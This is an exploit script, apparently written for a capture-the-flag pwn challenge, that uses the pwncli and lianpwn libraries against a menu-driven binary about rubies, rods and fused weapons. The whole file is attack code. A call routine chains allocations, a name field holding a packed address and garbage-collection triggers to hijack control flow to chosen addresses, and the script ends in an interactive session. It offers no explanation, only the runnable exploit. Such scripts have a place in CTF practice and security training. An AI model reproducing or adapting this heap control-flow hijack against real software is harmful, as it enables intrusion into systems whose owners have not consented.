#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


def takeRuby(name):
    cmd(1)
    ru(b"Sign the name of the new owner here:\n")
    sl(name)


def dropRuby():
    cmd(2)


def takeRod(name):
    cmd(3)
    ru(b"Sign the name of the new owner here:\n")
    sl(name)


def dropRod():
    cmd(4)


def fuse(name):
    cmd(5)
    ru(b"Sign the name of the one who wants to fuse this new weapon here:\n")
    sl(name)


def dropWeapon():
    cmd(6)


def leave():
    cmd(7)


def gc():
    cmd(8)


def call(addr):
    takeRuby(b"1")
    takeRuby(p64(addr))
    takeRod(b"1")
    takeRod(b"2")
    takeRod(b"3")
    gc()
    fuse(b"1")
    gc()
    gc()
    gc()
    dropWeapon()
    gc()


# call(0x41D5D0)
# call(0x41D610)
# call(0x41D5F0)
# call(0x41D630)
# call(0x41D650)
# call(0x41D670)
call(0x41D5E8)
call(0xDEADBEEF)

ia()
